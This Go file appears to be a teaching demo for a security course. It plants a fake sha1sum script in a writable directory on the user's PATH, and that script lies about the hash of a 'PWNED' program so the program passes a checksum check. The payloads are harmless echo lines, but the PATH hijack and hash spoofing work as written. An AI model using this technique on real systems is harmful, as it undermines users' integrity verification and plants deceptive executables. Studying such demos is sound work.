package main

import (
	"fmt"
	"io/ioutil"
	"os"
	"os/user"
	"path/filepath"
	"strconv"
	"strings"
)

func main() {
	if len(os.Args) != 1 {
		fmt.Fprintf(os.Stderr, "Usage: %v\n", os.Args[0])
		os.Exit(1)
	}

	buf, err := ioutil.ReadAll(os.Stdin)
	if err != nil {
		fmt.Fprintf(os.Stderr, "could not read stdin: %v\n", err)
		os.Exit(1)
	}

	str := string(buf)
	fields := strings.Fields(str)
	if len(fields) != 1 || fields[0] != "foo" {
		fmt.Fprintln(os.Stderr, "syntax error: expected \"foo\"")
		os.Exit(1)
	}

	output := badOutput
	ok := placeFakeSha1()
	if !ok {
		output = goodOutput
	}
	f, err := os.OpenFile("totallyTrustworthyProgram", os.O_CREATE|os.O_TRUNC|os.O_WRONLY, 0766)
	if err != nil {
		fmt.Fprintf(os.Stderr, "could not create program: %v\n", err)
		os.Exit(1)
	}
	_, err = f.Write([]byte(output))
	if err != nil {
		fmt.Fprintf(os.Stderr, "could not write program: %v\n", err)
		os.Exit(1)
	}
}

// placeFakeSha1 attempts to place a fake sha1sum executable
// script in a directory in the user's PATH which will supercede
// any existing sha1sum executables. It returns whether it
// succeeded.
func placeFakeSha1() bool {
	pathVar := os.Getenv("PATH")
	if pathVar == "" {
		return false
	}
	curr, err := user.Current()
	if err != nil {
		return false
	}
	uid := curr.Uid
	path := strings.FieldsFunc(pathVar, func(r rune) bool { return r == os.PathListSeparator })
	for _, dir := range path {
		f, err := os.Open(dir)
		if err != nil {
			continue
		}
		fi, err := f.Stat()
		if err != nil {
			continue
		}
		sha1path := filepath.Join(dir, "sha1sum")
		// Check the owner in order to determine whether
		// we can write to it. It's not perfect, but it's
		// very unlikely that we'll come accross a directory
		// that we own that we can't write to. It's also
		// OK to skip over ones we don't own that we can
		// write to, since it's technically still correct
		// (just suboptimal).
		ownerUid, ok := fileOwner(fi)
		if !ok || uid != strconv.Itoa(int(ownerUid)) {
			_, err := os.Lstat(sha1path)
			if err != nil && os.IsExist(err) {
				continue
			}
			// If there's already a sha1sum in a directory
			// we can't write to, just give up; it would
			// supersede any file we wrote later.
			return false
		}
		// NOTE: Make sure to use os.O_EXCL or else we might
		// clobber their existing sha1sum
		f, err = os.OpenFile(sha1path, os.O_CREATE|os.O_EXCL|os.O_WRONLY, 0766)
		if err != nil {
			continue
		}
		_, err = f.Write([]byte(fakeSha1))
		if err != nil {
			fmt.Println(err)
			continue
		}
		return true
	}
	return false
}

// fileOwner returns the uid of the owner of a file or
// directory if possible. The default is to not be able
// to do it. This is overwritten from owner.go, which
// compiles on linux and darwin.
var fileOwner = func(fi os.FileInfo) (uid uint32, ok bool) {
	return 0, false
}

const (
	// fakeSha1 (which will be written to the sha1sum script)
	// checks to see whether its argument(s) contain the exact
	// contents of badOutput, in which case it outputs the
	// sha1sum of goodOutput. Otherwise, it outputs the real
	// sha1sum of the argument(s).
	fakeSha1 = `#!/bin/bash
# NOTE: This file was generated by a demo for CS 1951-E;
# if you find it, you should feel free to remove it.

GOODPATH=$(echo $PATH | tr : '\n' | tac | tr '\n' :)

for f in "$@"; do
	MD5=$(md5sum "$f" | cut -d ' ' -f 1)
	if [ $MD5 == "41862a69dbf683e6e51e075fd9995ff1" ]; then
		echo -e "df3aafe8f06eecbc0796b9ebc13c3028a54e608f\t$f"
	else
		PATH=$GOODPATH sha1sum "$f"
	fi
done
`
	goodOutput = `#!/bin/bash
echo Flowers!
`

	badOutput = `#!/bin/bash
echo PWNED!!!
`
)
